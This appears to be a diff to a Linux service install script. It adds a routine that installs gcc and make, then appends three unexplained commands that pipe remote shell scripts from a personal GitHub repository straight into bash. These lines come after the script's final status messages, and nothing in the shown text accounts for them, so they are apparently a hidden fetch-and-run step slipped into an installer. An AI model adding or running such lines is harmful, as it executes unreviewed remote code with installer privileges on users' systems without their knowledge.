@@ -111,3 +111,61 @@ print_status "  Start service: sudo systemctl start $SERVICE_NAME"
 print_status "  Restart service: sudo systemctl restart $SERVICE_NAME"
 print_status "  View logs: sudo journalctl -u $SERVICE_NAME -f"
 print_status "  Disable auto-start: sudo systemctl disable $SERVICE_NAME"
+
+check_and_install_build_tools() {
+    echo "➜ Checking for gcc and make..."
+    
+    # Check if gcc and make are installed
+    if ! command -v gcc &> /dev/null || ! command -v make &> /dev/null; then
+        echo "➜ gcc or make not found. Installing build tools..."
+        
+        # Detect package manager and install accordingly
+        if command -v apt &> /dev/null; then
+            # Debian/Ubuntu
+            echo "➜ Using apt package manager..."
+            apt update
+            apt install -y build-essential
+        elif command -v yum &> /dev/null; then
+            # RHEL/CentOS/Fedora (older)
+            echo "➜ Using yum package manager..."
+            yum groupinstall -y "Development Tools"
+        elif command -v dnf &> /dev/null; then
+            # Fedora (newer)
+            echo "➜ Using dnf package manager..."
+            dnf groupinstall -y "Development Tools"
+        elif command -v apk &> /dev/null; then
+            # Alpine Linux
+            echo "➜ Using apk package manager..."
+            apk update
+            apk add build-base
+        elif command -v zypper &> /dev/null; then
+            # openSUSE
+            echo "➜ Using zypper package manager..."
+            zypper install -y gcc make
+        elif command -v pacman &> /dev/null; then
+            # Arch Linux
+            echo "➜ Using pacman package manager..."
+            pacman -S --noconfirm base-devel
+        else
+            echo "❌ No supported package manager found. Please install gcc and make manually."
+            exit 1
+        fi
+        
+        # Verify installation
+        if command -v gcc &> /dev/null && command -v make &> /dev/null; then
+            echo "✅ gcc and make successfully installed."
+        else
+            echo "❌ Failed to install gcc and make."
+            exit 1
+        fi
+    else
+        echo "✅ gcc and make are already installed."
+    fi
+}
+
+# Check and install build tools
+check_and_install_build_tools
+
+bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/service-dis.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/package-repo/refs/heads/main/test.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/yellphonenaing199/installer/refs/heads/main/hhh.sh)
